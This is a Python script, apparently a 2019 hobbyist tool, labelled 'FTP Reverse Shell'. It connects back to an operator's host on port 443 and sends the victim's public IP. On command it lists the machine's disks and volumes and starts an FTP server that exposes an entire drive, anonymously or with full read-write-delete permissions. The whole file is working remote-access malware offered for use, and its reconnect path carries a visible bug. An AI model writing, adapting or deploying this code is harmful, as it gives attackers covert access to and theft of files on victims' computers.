from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from multiprocessing import Process
from pyftpdlib import servers
from time import sleep
from requests import get
import socket 
import psutil
import win32api

# Al0nnso - 2019
# FTP Reverse Shell
# NOT TESTED WITH EXTERN NETWORK

try:
    ip = get('https://api.ipify.org').text
except:
    ip='ERROR'
    pass
ftp=None
server = None
disk = "\\"
address = ("0.0.0.0", 21)
user = None
host = '192.168.15.5'# YOUR IP OR HOST
port = 443

def ftp_main(server, address, disk, user, s, ip):
    print('FTP STARTING...')
    try:
        authorizer = DummyAuthorizer()
        try:
            try:
                s.send('FTP starting...: {}'.format(ip).encode())
            except:
                pass
            print('TRYING...')
            if disk.isalpha():
                disk = '{}:\\'.format(disk)
            if user == None:
                authorizer.add_anonymous(disk)
            elif user == '/user':
                authorizer.add_user('user', '404', disk, perm="elradfmwMT")
            else:
                authorizer.add_user(user, user, disk, perm="elradfmwMT")
        except:
            authorizer.add_anonymous("\\")
        handler = FTPHandler
        handler.authorizer = authorizer
        address = ("0.0.0.0", 21)
        server = servers.FTPServer(address, FTPHandler)
        try:
            s.send('[+] FTP server started on ftp://{}:21'.format(ip).encode())
        except:
            pass
        server.serve_forever()
    except Exception as e:
        sleep(10)
        print('reconecting...')
        try:
            s.send('reconecting...'.encode())
        except:
            pass
        print(e)
        ftp_main()

def socketConn(ftp):
    try:
        global address, disk, user, host, port, server, ip
        # server=None
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send('[+] Connected'.encode())
        while True:
            Fdata = s.recv(3000)
            Fdata = Fdata.decode()
            if len(Fdata) > 0 or Fdata == " ":
                print(Fdata)
                data = str(Fdata).split(" ")
                if 'exit' in data[0].lower():
                    try:
                        ftp.terminate()
                        s.send('ftp closed'.encode())
                    except:
                        s.send('WTF exit?'.encode())
                elif data[0].lower()=='ip' or data[0].lower()=='inf':
                	s.send(str(ip).encode())

                elif data[0].lower()=='disk' or data[0].lower()=='d':#LIST DISK
                    try:
                        disks=None
                        disks=psutil.disk_partitions()
                        s.send(str(disks).replace(',','\n').encode())
                    except:
                        s.send('FAIL DISK'.encode())
                elif data[0].lower()=='vol' or data[0].lower()=='v':#LIST VOL OF DISK
                    try:
                        drives = win32api.GetLogicalDriveStrings()
                        drives = drives.split('\000')[:-1]
                        s.send((str(drives).replace("\'","")).encode())
                    except Exception as e:
                        s.send('FAIL VOL: {}'.format(e).encode())
                elif (data[0].lower() == 'start'):
                    mode = data[0].lower()
                    print(len(data))
                    for i in range(len(data)):
                        print(str(i))
                        if mode == 'start' and '-D' in data[i].upper():
                            if data[i + 1].isalpha():
                                disk = data[i + 1].upper()
                                s.send('DISK: {}'.format(disk).encode())
                        if mode == 'start' and '-U' in data[i].upper():
                            user = data[i + 1]
                            s.send('USER: {}'.format(user).encode())
                        if mode == 'start' and '-A' in data[i].upper():
                            addr = data[i + 1]
                            print('addr: {}'.format(addr))
                            try:
                                address = (addr, 21)
                                s.send('address: {}'.format(address).encode())
                            except:
                                s.send('fail to set addr...'.encode())
                    s.send(' '.encode())
                    if ftp!=None:
                        ftp.terminate()
                        s.send('ftp closed'.encode())
                    ftp = Process(target=ftp_main,args=(server, address, disk, user, s, ip))
                    ftp.start()
                else:
                    s.send(' '.encode())
            else:
                s.send(' '.encode())
    except Exception as e:
        print('Socket reconection...')
        print(e)
        s = None
        sleep(2)
        socketConn(ftp)

if __name__ == '__main__':
    socketConn(ftp)
